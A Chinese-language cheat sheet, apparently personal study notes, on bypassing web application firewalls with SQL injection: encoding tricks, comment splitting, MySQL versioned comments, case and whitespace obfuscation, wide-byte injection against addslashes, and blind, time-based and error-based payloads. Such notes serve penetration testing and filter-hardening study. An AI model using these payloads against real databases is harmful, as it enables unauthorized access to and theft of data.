# sql注入绕过姿势

## 1.编码绕过（Encoding Bypass）

### ✔ URL编码

UNION → %55%4e%49%4f%4e

---

### ✔ 双重编码

%2555%254e%2549%254f%254e

---

### ✔ Unicode编码

\u0055\u004e\u0049\u004f\u004e

---

### ✔ 十六进制

SELECT 0x61646d696e

等价= SELECT 'admin'



## 

## 2.注释绕过（Comment Bypass）

👉 把关键字“切碎”

---

### ✔ 内联注释

`UN/**/ION SEL/**/ECT`

---

### ✔ 行注释

--   
#

---

### ✔ MySQL 特性（重点🔥）

`/*!50000UNION SELECT*/`

**版本注释（Versioned Comment）**

格式：

`/*!版本号 SQL语句 */`

**如果 MySQL 版本 ≥ 5.0.0，就执行里面的 SQL**  
否则当作普通注释忽略

在 WAF 眼里：  
👉 只是注释 ❌（不会拦）

在 MySQL 眼里：  
👉 是 UNION ✅（会执行）

---

### ✔ 混合注释

`UN/*abc*/ION/**/SELECT`







## 3. 关键字变形（Keyword Obfuscation）

---

### ✔ 大小写绕过

UnIoN SeLeCt

---

### ✔ 双写绕过

UNUNIONION

👉 针对 replace("union","")

---

### ✔ 插入特殊字符

UNI%0aON

---

### ✔ 拼接绕过

CONCAT('UN','ION')

---





## 4. 语法替换（非常关键🔥）

👉 不用 UNION SELECT，也能注入

---

### ✔ OR 替代

' OR 1=1 #

---

### ✔ AND 布尔盲注

AND 1=1  
AND 1=2

---

### ✔ EXISTS 替代

AND EXISTS(SELECT 1)

---

### ✔ 子查询替代

AND (SELECT 1)=1

---

### ✔ LIMIT 绕过

LIMIT 0,1

---

### ✔ ORDER BY 探测列数

ORDER BY 3

---

 





## 5. 数据库特性绕过（高级🔥）

---

### ✔ MySQL

/*!50000SELECT*/

SELECT @@version

---

### ✔ 字符串拼接

CHAR(97,100,109,105,110)

👉 等价：admin

---

### ✔ 宽字节注入（经典）

%df'

👉 绕过 addslashes

---

### ✔ NULL 绕过

UNION SELECT NULL,NULL,NULL

---









## 6. 空白符绕过（非常常用🔥）

---

### ✔ 替换空格

%09  → tab  
%0a  → 换行  
%0b  → 垂直tab  
%0c  
%0d

---

### ✔ 示例

UNION%0aSELECT

---









## 7. 逻辑绕过（高阶思维）

### ✔ 时间盲注

SLEEP(5)

---

### ✔ 报错注入

updatexml()  
extractvalue()

---

### ✔ 布尔盲注

ASCII(SUBSTR(...))

---

### ✔ DNS外带（高级）

LOAD_FILE()


